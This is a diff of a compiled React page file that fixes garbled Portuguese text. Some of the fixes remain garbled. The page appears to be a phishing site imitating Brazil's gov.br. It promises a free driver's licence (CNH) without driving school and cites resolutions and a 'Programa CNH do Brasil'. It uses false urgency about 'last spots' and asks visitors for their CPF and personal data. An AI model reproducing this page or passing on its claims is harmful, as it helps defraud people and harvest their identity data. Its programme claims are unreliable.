             className: "bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg",
-            children: "Fazer Minha InscriÃ§Ã£o Agora"
+            children: "Fazer Minha Inscrição Agora"
           }), l.jsx("p", {
             className: "text-base leading-relaxed mt-3",
             style: {
               color: "#555555",
               opacity: .6
             },
-            children: "Ãšltimas vagas para 2026"
+            children: "Últimas vagas para 2026"
           })]
         }), l.jsx("h2", {
           className: "text-xl font-bold mt-8 mb-4",
           style: {
             color: "#333333"
           },
-          children: "1. O que mudou com a nova resoluÃ§Ã£o?"
+          children: "1. O que mudou com a nova resolução?"
         }), l.jsxs("ul", {
           className: "list-disc pl-6 space-y-3 mb-6 text-base leading-relaxed",
           style: {
@@ -24493,35 +24493,35 @@ function uT() {
                 color: "#333333"
               },
               children: "Fim da obrigatoriedade de autoescola:"
-            }), " Candidatos nÃ£o precisam mais frequentar Centros de FormaÃ§Ã£o de Condutores (CFCs)"]
+            }), " Candidatos não precisam mais frequentar Centros de Formação de Condutores (CFCs)"]
           }), l.jsxs("li", {
             children: [l.jsx("strong", {
               style: {
                 color: "#333333"
               },
-              children: "Curso teÃ³rico online e gratuito:"
-            }), " DisponÃ­vel apÃ³s realizar o cadastro."]
+              children: "Curso teórico online e gratuito:"
+            }), " Disponível após realizar o cadastro."]
           }), l.jsxs("li", {
             children: [l.jsx("strong", {
               style: {
                 color: "#333333"
               },
-              children: "Carga horÃ¡ria prÃ¡tica reduzida:"
-            }), " De 20 horas obrigatÃ³rias para apenas 2 horas mÃ­nimas"]
+              children: "Carga horária prática reduzida:"
+            }), " De 20 horas obrigatórias para apenas 2 horas mínimas"]
           }), l.jsxs("li", {
             children: [l.jsx("strong", {
               style: {
                 color: "#333333"
               },
-              children: "Aulas prÃ¡ticas flexÃ­veis:"
-            }), " Podem ser realizadas com instrutor autÃ´nomo credenciado pelo Detran"]
+              children: "Aulas práticas flexíveis:"
+            }), " Podem ser realizadas com instrutor autônomo credenciado pelo Detran"]
           }), l.jsxs("li", {
             children: [l.jsx("strong", {
               style: {
                 color: "#333333"
               },
-              children: "ReduÃ§Ã£o de atÃ© 80% nos custos:"
-            }), " Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graÃ§a"]
+              children: "Redução de até 80% nos custos:"
+            }), " Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graça"]
           })]
         }), l.jsxs("div", {
           className: "px-4 py-3 mb-6 mx-auto",
@@ -24535,18 +24535,18 @@ function uT() {
             style: {
               color: "#333333"
             },
-            children: "Ãšltimas Vagas para 2026"
+            children: "Últimas Vagas para 2026"
           }), l.jsxs("p", {
             className: "text-base leading-relaxed",
             style: {
               color: "#555555"
             },
-            children: ["Devido Ã  alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas sÃ£o as Ãºltimas vagas disponÃ­veis para ", l.jsx("strong", {
+            children: ["Devido Á  alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas são as últimas vagas disponíveis para ", l.jsx("strong", {
               style: {
                 color: "#333333"
               },
               children: "janeiro de 2026"
-            }), ". Caso nÃ£o realize a inscriÃ§Ã£o com urgÃªncia, a prÃ³xima oportunidade serÃ¡ somente entre 2026 e 2027. Quem nÃ£o se cadastrar arcarÃ¡ com os custos integrais do processo de habilitaÃ§Ã£o."]
+            }), ". Caso não realize a inscrição com urgência, a próxima oportunidade será somente entre 2026 e 2027. Quem não se cadastrar arcará com os custos integrais do processo de habilitação."]
           })]
         }), l.jsx("div", {
           id: "como-se-inscrever",
@@ -24567,20 +24567,20 @@ function uT() {
           style: {
             color: "#555555"
           },
-          children: "O processo de inscriÃ§Ã£o Ã© simples e pode ser feito totalmente online:"
+          children: "O processo de inscrição é simples e pode ser feito totalmente online:"
         }), l.jsxs("ol", {
           className: "list-decimal pl-6 space-y-3 mb-6 text-base leading-relaxed",
           style: {
             color: "#555555"
           },
           children: [l.jsx("li", {
-            children: "Clique no botÃ£o abaixo para iniciar seu cadastro"
+            children: "Clique no botão abaixo para iniciar seu cadastro"
           }), l.jsx("li", {
             children: "Informe seu CPF para verificar elegibilidade"
           }), l.jsx("li", {
             children: "Confirme seus dados pessoais"
           }), l.jsx("li", {
-            children: "Sua Carteira de Motorista serÃ¡ emitida em atÃ© 20 dias"
+            children: "Sua Carteira de Motorista será emitida em até 20 dias"
           })]
         }), l.jsxs("div", {
           className: "text-center my-8",
@@ -24589,7 +24589,7 @@ function uT() {
             className: "bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg",
             children: l.jsx("span", {
               className: "underline",
-              children: "Fazer Minha InscriÃ§Ã£o Agora"
+              children: "Fazer Minha Inscrição Agora"
             })
           }), l.jsx("p", {
             className: "text-base leading-relaxed mt-3",
@@ -24597,7 +24597,7 @@ function uT() {
               color: "#555555",
               opacity: .6
             },
-            children: "Ãšltimas vagas para 2026"
+            children: "Últimas vagas para 2026"
           })]
         }), l.jsxs("div", {
           className: "mt-8",
@@ -24613,9 +24613,9 @@ function uT() {
               color: "#555555"
             },
             children: [l.jsx("li", {
-              children: "ResoluÃ§Ã£o Contran nÂº 985/2025"
+              children: "Resolução Contran nÂº 985/2025"
             }), l.jsx("li", {
-              children: "Lei nÂº 14.071/2020 (Nova Lei de TrÃ¢nsito)"
+              children: "Lei nÂº 14.071/2020 (Nova Lei de Trânsito)"
             }), l.jsx("li", {
               children: "Decreto nÂº 11.999/2025 (Programa CNH do Brasil)"
             })]
@@ -24649,7 +24649,7 @@ function uT() {
               className: "flex justify-between items-center py-4 border-b border-white/20",
               children: [l.jsx("span", {
                 className: "font-semibold",
-                children: "ACESSO Ã€ INFORMAÃ‡ÃƒO"
+                children: "ACESSO Á€ INFORMAÇÁƒO"
               }), l.jsx(Zr, {
                 className: "text-white/70"
               })]
@@ -24657,7 +24657,7 @@ function uT() {
               className: "flex justify-between items-center py-4 border-b border-white/20",
               children: [l.jsx("span", {
                 className: "font-semibold",
-                children: "COMPOSIÃ‡ÃƒO"
+                children: "COMPOSIÇÁƒO"
               }), l.jsx(Zr, {
                 className: "text-white/70"
               })]
@@ -24673,7 +24673,7 @@ function uT() {
               className: "flex justify-between items-center py-4 border-b border-white/20",
               children: [l.jsx("span", {
                 className: "font-semibold",
-                children: "CENTRAL DE CONTEÃšDOS"
+                children: "CENTRAL DE CONTEÚDOS"
               }), l.jsx(Zr, {
                 className: "text-white/70"
               })]
@@ -24681,7 +24681,7 @@ function uT() {
               className: "flex justify-between items-center py-4 border-b border-white/20",
               children: [l.jsx("span", {
                 className: "font-semibold",
-                children: "SERVIÃ‡OS"
+                children: "SERVIÇOS"
               }), l.jsx(Zr, {
                 className: "text-white/70"
               })]
@@ -24779,7 +24779,7 @@ function uT() {
               style: {
                 color: "#1351B4"
               },
-              children: "NÃºmero do CPF"
+              children: "Número do CPF"
             })]
           }), l.jsxs("p", {
             className: "text-sm text-gray-600 mb-4",
